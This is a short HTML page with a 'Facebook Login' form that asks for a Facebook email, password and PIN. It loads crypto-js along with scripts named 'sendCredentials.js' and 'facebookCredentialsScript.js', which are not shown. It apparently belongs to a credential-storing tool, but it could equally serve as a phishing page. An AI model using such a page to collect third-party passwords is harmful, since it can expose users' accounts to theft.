<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enter Facebook Credentials</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .form-container {
            width: 300px;
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 5px;
        }
        input[type='email'], input[type='password'] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h2>Facebook Login</h2>
        <form id="fbCredentialsForm">
            <label for="fbEmail">Facebook Email:</label>
            <input type="email" id="fbEmail" name="fbEmail" required>

            <label for="fbPassword">Facebook Password:</label>
            <input type="password" id="fbPassword" name="fbPassword" required>

            <!-- New PIN input field -->
            <label for="pinInput">Set Up Your PIN:</label>
            <input type="password" id="pinInput" name="pinInput" required placeholder="Enter a PIN">

            <button type="submit">Save Credentials</button>
        </form>
    </div>

    <script src="crypto-js/src/core.js"></script>
    <script src="crypto-js/src/enc-base64.js"></script>
    <script src="crypto-js/src/md5.js"></script>
    <script src="crypto-js/src/evpkdf.js"></script>
    <script src="crypto-js/src/cipher-core.js"></script>
    <script src="crypto-js/src/aes.js"></script>
    <script src="crypto-js/src/sha256.js"></script>
    <script src="crypto-js/src/crypto-js.js"></script>
    <script src="js/utils.js"></script>  
    <script src="sendCredentials.js"></script>
    <script src="facebookCredentialsScript.js"></script>
</body>
</html>
